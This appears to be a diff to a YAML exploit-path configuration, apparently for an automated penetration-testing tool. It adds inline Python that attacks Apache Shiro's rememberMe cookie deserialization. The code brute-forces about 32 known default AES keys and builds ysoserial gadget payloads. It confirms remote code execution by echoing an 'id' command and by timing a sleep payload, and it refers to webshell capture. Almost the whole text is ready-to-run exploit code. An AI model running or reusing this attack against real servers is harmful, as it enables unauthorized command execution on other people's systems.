@@ -97,17 +97,35 @@ exploit_paths:
         evidence_capture:
           shell_type: "rce_shiro_callback"
 
-  # 路径 B: 回显检测（su18 EX-TomcatEcho）
+  # 路径 B: 回显检测（su18 EX-TomcatEcho）—— inline Python 绕开脚本su18 bug
   - path_id: shiro_echo
-    name: "shiro_exploit.py 回显检测（TomcatEcho）"
+    name: "su18 EX-TomcatEcho 回显检测"
     priority: 3
     conditions:
       shiro_confirmed: true
     steps:
-      - id: shiro_echo
-        description: "回显检测爆破（EX-TomcatEcho，命令输出在 HTTP 响应中）"
+      - id: shiro_echo_direct
+        description: "直接调 /opt/ysuserial + pycryptodome AES + curl 回显爆破"
         command: |
-          python3 {skill_dir}/scripts/shiro_exploit.py {ENDPOINT} --echo
+          python3 -c '
+          import base64,os,subprocess,sys
+          from Crypto.Cipher import AES
+          t="{ENDPOINT}"
+          K=["kPH+bIxk5D2deZiIxcaaaA==","4AvVhmFLUs0KTA3Kprsdag==","3AvVhmFLUs0KTA3Kprsdag==","2AvVhdsgUs0FSA3SDFAdag==","Z3VucwAAAAAAAAAAAAAAAA==","wGiHplamyXlVB11UXWol8g==","fCq+/xW488hMTCD+cmJ3aQ==","0AvVhmFLUs0KTA3Kprsdag==","1QWLxg+NYmxraMoxAXu/Iw==","ZnJhbWUxLjYuMA==","L7RioUULEFhRyxM7a2R/Yg==","r0e3c16IdVkouZgk1TKVMg==","bWluZS1hc3NldC1rZXk6QQ==","6ZmI6I2j5Y+R5aSn5ZOlAA==","5aaC5qKm5oqA5pyvAAAAAA==","bWicP0XBL7iLRfMSYSSZnQ==","WcfHGU25gNnTxTlmJMeSpw==","ClLk69oNcA3m+s0jIMIkpg==","Is9zJ3pzNh2cgTHB4ua3+Q==","U3ByaW5nQmxhZGUAAAAAAA==","R29vZCBsdWNrISEhISEhISE=","NsZXjXVklWPZwOfkvk6kUA==","GAevYnznvgNCURavBhCr1w==","aU1pcmFjbGVpTWlyYWNsZQ==","ZUdsaGJFshHKlBDbLRvSTw==","SDKOLKn2J1j/2BHjeZwAoQ==","tiVV6g3uZBGfhUGUzwIImQ==","cmVtZW1iZXJNZQAAAAAAAA==","66v1O8keKNV3TTcGPK1wzg==","bXRvbnMAAAAAAAAAAAAAAA==","a2VlcE9uR29pbmdBbmRGaQ==","Bf7MfkNR0axGGpZDB1bABw=="]
+          G=["CommonsBeanutils1","CommonsCollections2","CommonsCollections1","CommonsCollections6","CommonsCollections3","CommonsCollections4"]
+          ks=[base64.b64decode(k) for k in K if len(base64.b64decode(k))==16]
+          for g in G:
+            r=subprocess.run(["/opt/ysuserial","-g",g,"-p","EX-TomcatEcho"],capture_output=True,timeout=25)
+            if r.returncode!=0 or len(r.stdout)<50: print(f"{g}... SKIP"); continue
+            pl=r.stdout; print(f"{g}... OK ({len(pl)} bytes)")
+            for dk in ks:
+              iv=os.urandom(16); pad=16-(len(pl)%16); pd=pl+bytes([pad]*pad)
+              ciph=AES.new(dk,AES.MODE_CBC,iv); cookie=base64.b64encode(iv+ciph.encrypt(pd)).decode()
+              r2=subprocess.run(["curl","-s","--max-time","15",t,"-H",f"Cookie: rememberMe={cookie}","-H","X-Token-Data: id"],capture_output=True,text=True,timeout=20)
+              if "uid=" in r2.stdout:
+                print("SHIRO_RCE_CONFIRMED"); print(f"SHIRO_KEY={base64.b64encode(dk).decode()}"); print(f"SHIRO_GADGET={g}"); print(r2.stdout[:2000]); sys.exit(0)
+          print("ALL_FAILED")
+          '
         timeout: 600
         success_criteria:
           stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
@@ -134,17 +152,50 @@ exploit_paths:
         evidence_capture:
           shell_type: "rce_shiro_webshell"
 
-  # 路径 D: 时序盲检测
+  # 路径 D: 时序盲检测 —— inline Python 绕开脚本su18 bug
   - path_id: shiro_blind
-    name: "shiro_exploit.py 时序盲检测"
+    name: "su18 TS-N 时序盲检测"
     priority: 5
     conditions:
       shiro_confirmed: true
     steps:
-      - id: shiro_blind
-        description: "时序盲检测爆破（sleep 验证）"
+      - id: shiro_blind_direct
+        description: "直接调 /opt/ysuserial + pycryptodome AES + 响应时间比对"
         command: |
-          python3 {skill_dir}/scripts/shiro_exploit.py {ENDPOINT} --blind
+          python3 -c '
+          import base64,os,subprocess,sys,time
+          from Crypto.Cipher import AES
+          t="{ENDPOINT}"
+          K=["kPH+bIxk5D2deZiIxcaaaA==","4AvVhmFLUs0KTA3Kprsdag==","3AvVhmFLUs0KTA3Kprsdag==","2AvVhdsgUs0FSA3SDFAdag==","Z3VucwAAAAAAAAAAAAAAAA==","wGiHplamyXlVB11UXWol8g==","fCq+/xW488hMTCD+cmJ3aQ==","0AvVhmFLUs0KTA3Kprsdag==","1QWLxg+NYmxraMoxAXu/Iw==","ZnJhbWUxLjYuMA==","L7RioUULEFhRyxM7a2R/Yg==","r0e3c16IdVkouZgk1TKVMg==","bWluZS1hc3NldC1rZXk6QQ==","6ZmI6I2j5Y+R5aSn5ZOlAA==","5aaC5qKm5oqA5pyvAAAAAA==","bWicP0XBL7iLRfMSYSSZnQ==","WcfHGU25gNnTxTlmJMeSpw==","ClLk69oNcA3m+s0jIMIkpg==","Is9zJ3pzNh2cgTHB4ua3+Q==","U3ByaW5nQmxhZGUAAAAAAA==","R29vZCBsdWNrISEhISEhISE=","NsZXjXVklWPZwOfkvk6kUA==","GAevYnznvgNCURavBhCr1w==","aU1pcmFjbGVpTWlyYWNsZQ==","ZUdsaGJFshHKlBDbLRvSTw==","SDKOLKn2J1j/2BHjeZwAoQ==","tiVV6g3uZBGfhUGUzwIImQ==","cmVtZW1iZXJNZQAAAAAAAA==","66v1O8keKNV3TTcGPK1wzg==","bXRvbnMAAAAAAAAAAAAAAA==","a2VlcE9uR29pbmdBbmRGaQ==","Bf7MfkNR0axGGpZDB1bABw=="]
+          G=["CommonsBeanutils1","CommonsCollections2","CommonsCollections1","CommonsCollections6","CommonsCollections3","CommonsCollections4"]
+          ks=[base64.b64decode(k) for k in K if len(base64.b64decode(k))==16]
+          print("[*] 收集基线响应时间（5次正常请求）...")
+          bl=[time.time()-time.time()]  # placeholder, overwritten below
+          bl_times=[]
+          for _ in range(5):
+            try:
+              t0=time.time(); subprocess.run(["curl","-s","-o","/dev/null",t,"-H","Cookie: rememberMe=baseline_test","--max-time","15"],capture_output=True,timeout=18)
+              bl_times.append(time.time()-t0); time.sleep(0.3)
+            except: pass
+          if not bl_times: print("ALL_FAILED"); sys.exit(1)
+          avg=sum(bl_times)/len(bl_times); mx=max(bl_times); th=mx+1.5
+          print(f"[*] 基线: avg={avg:.1f}s, max={mx:.1f}s, 阈值={th:.1f}s")
+          sleep_sec=5; blind_type=f"TS-{sleep_sec}"
+          for g in G:
+            r=subprocess.run(["/opt/ysuserial","-g",g,"-p",blind_type],capture_output=True,timeout=25)
+            if r.returncode!=0 or len(r.stdout)<50: print(f"{g}... SKIP"); continue
+            pl=r.stdout; print(f"{g}... OK ({len(pl)} bytes)")
+            for dk in ks:
+              iv=os.urandom(16); pad=16-(len(pl)%16); pd=pl+bytes([pad]*pad)
+              ciph=AES.new(dk,AES.MODE_CBC,iv); cookie=base64.b64encode(iv+ciph.encrypt(pd)).decode()
+              try:
+                t0=time.time(); subprocess.run(["curl","-s","-o","/dev/null",t,"-H",f"Cookie: rememberMe={cookie}","--max-time",str(sleep_sec+10)],capture_output=True,timeout=sleep_sec+15)
+                elapsed=time.time()-t0
+                if elapsed>th:
+                  print("SHIRO_RCE_CONFIRMED"); print(f"SHIRO_KEY={base64.b64encode(dk).decode()}"); print(f"SHIRO_GADGET={g}"); print(f"响应时间: {elapsed:.1f}s (基线: {avg:.1f}s)"); sys.exit(0)
+              except: pass
+          print("ALL_FAILED")
+          '
         timeout: 600
         success_criteria:
           stdout_contains_any: ["SHIRO_RCE_CONFIRMED"]
